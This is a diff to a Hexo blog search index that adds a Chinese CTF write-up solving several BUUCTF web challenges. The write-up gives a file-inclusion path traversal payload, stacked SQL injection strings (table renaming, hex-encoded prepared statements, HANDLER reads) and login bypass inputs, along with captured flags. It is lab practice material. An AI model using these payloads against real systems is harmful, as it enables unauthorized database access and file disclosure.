@@ -23,4 +23,114 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>PE Files (1)</title>
+    <url>/2020/07/22/PE-Files-1/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>week20200713-20200719</title>
+    <url>/2020/07/23/week20200713-20200719/</url>
+    <content><![CDATA[<h1 id="Week-1-lt-2020-07-13-2020-07-19-gt"><a href="#Week-1-lt-2020-07-13-2020-07-19-gt" class="headerlink" title="Week 1 &lt;2020.07.13 - 2020.07.19&gt;"></a>Week 1 &lt;2020.07.13 - 2020.07.19&gt;</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开实例，只有一张图片，右键查看网页代码：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>&lt;!DOCTYPE html&gt;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>&lt;html lang=”en”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;head&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta charset=”UTF-8”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta name=”viewport” content=”width=device-width, initial-scale=1.0”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta http-equiv=”X-UA-Compatible” content=”ie=edge”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;title&gt;Document&lt;/title&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;/head&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;body&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;!–source.php–&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;br&gt;&lt;img src=”<a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" target="_blank" rel="noopener">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a>“ /&gt;&lt;/body&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;/html&gt;</td>
+</tr>
+</tbody></table>
+<p>可以获得source.php代码：<br>payload: <a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];  <span class="comment">// $whitelist</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;  <span class="comment">// $page is string</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=&amp;#92;"</span>https:<span class="comment">//i.loli.net/2018/11/01/5bdb0d93dc794.jpg&amp;#92;" /&gt;";</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过 checkFile()  校验则可以包含flag所在文件<br>先访问$whitelist 中的hint.php<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php</a><br>获得文件名 <img src="http://localhost:9002/file/image/5f17017f657e1fa600390ac1" alt=""><br>构造payload：<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
+<p>flag ： flag{82c0aedf-43e8-4745-9f2c-38444a3c2f30}</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><strong>方法一：堆叠注入，重命名</strong></p>
+<p>SQL语句 ： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show databases#</span><br></pre></td></tr></table></figure>
+<p><img src="http://localhost:9002/file/image/5f186ec6657e1fa600390b7a" alt=""><br>SQL语句 ： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables#</span><br></pre></td></tr></table></figure>
+<p><img src="http://localhost:9002/file/image/5f186ef6657e1fa600390b86" alt=""><br>SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+<p><img src="http://localhost:9002/file/image/5f18709a657e1fa600390bc9" alt=""><br>此处发现了flag字段，以下重点：<br>重命名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;;</span><br><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line">desc  words;#</span><br></pre></td></tr></table></figure>
+<p>再操作取得flag：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p>flag： flag{6804a2d0-bcbf-4f1c-8785-d1f241519712}</p>
+<p><strong>方法二：预处理</strong></p>
+<p>字符串转十六进制：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;</span><br></pre></td></tr></table></figure>
+<p>=&gt; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">SeT @s2h &#x3D; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare ss from @s2h;</span><br><span class="line">execute ss;</span><br></pre></td></tr></table></figure>
+<p>(SeT 绕过过滤函数）<br>成功获得flag</p>
+<p><strong>方法三：handler查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;1919810931114514&#96; open;</span><br><span class="line">handler &#96;1919810931114514&#96; read first;#</span><br></pre></td></tr></table></figure>
+
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>原理：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>
+<p>非预期解：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>预期解：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;</span><br><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT;</span><br><span class="line">select 1</span><br></pre></td></tr></table></figure>
+<p>解释：mysql缺省不支持oracle将 || 解释为字符串拼接，第二行启用了兼容设置</p>
+<p>flag{13a1a49a-d096-4a5b-aac0-ef90df2f1b2c}</p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>随便试一下就过了。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>URL：<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
+<p>flag{d1d4ffc6-0e42-4ae0-b177-985390fbf756}</p>
+]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
 </search>
